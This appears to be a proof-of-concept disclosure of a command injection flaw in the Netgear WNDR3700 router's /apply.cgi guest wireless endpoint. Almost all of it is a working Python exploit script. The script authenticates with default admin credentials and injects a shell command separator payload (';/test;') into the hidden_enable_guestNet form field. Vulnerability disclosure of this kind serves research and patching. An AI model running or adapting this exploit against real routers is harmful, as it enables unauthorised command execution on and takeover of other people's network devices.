# PoC
WNDR3700 has a command injection vulnerability at "/apply.cgi?/WLG_wireless_guest1.htm"


```
#!/usr/bin/env python3
import requests, re, time



def make_request(target, port, path, datas):

    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Authorization": "Basic YWRtaW46cGFzc3dvcmQ="}


    url = "http://{}:{}/".format(target, port)

    try:
        r1 = requests.get(url, headers=headers)
        # print(r1.text)
    except:
        print ('[-] Target not reachable, Exiting...')

    time.sleep(5)
    url = "http://{}:{}{}".format(target, port, path)

    r3 = requests.post(url, headers=headers, data=datas)
    # try:
    #     r3 = requests.post(url, headers=headers, data=datas)
    # except:
    #     print ('[-] Target not reachable, Exiting...')





if __name__ == '__main__':
    host = "192.168.1.1"
    port = 80
    path = '/apply.cgi?/WLG_wireless_guest1.htm'
    payload = ';/test;'
    datas = {"submit_flag": "wlan_g1", "old_length": "", "generate_flag": "", "sec_wpaphrase_len": "", "hidden_wpa_psk": "", "hidden_sec_type": "1", "wep_press_flag": "", "wpa1_press_flag": "0", "wpa2_press_flag": "0", "wpas_press_flag": "0", "wps_change_flag": "5", "hidden_enable_guestNet": "0", "hidden_enable_ssidbro": "1", "hidden_allow_guest": "0", "radiusServerIP": "", "s_gssid": "NETGEAR_Guest1", "hidden_WpaeRadiusSecret": "", "enable_ssidbro": "1", "gssid": "NETGEAR_Guest1", "security_type": "Disable"}
    datas["hidden_enable_guestNet"] = payload
    make_request(host, port, path, datas)

```

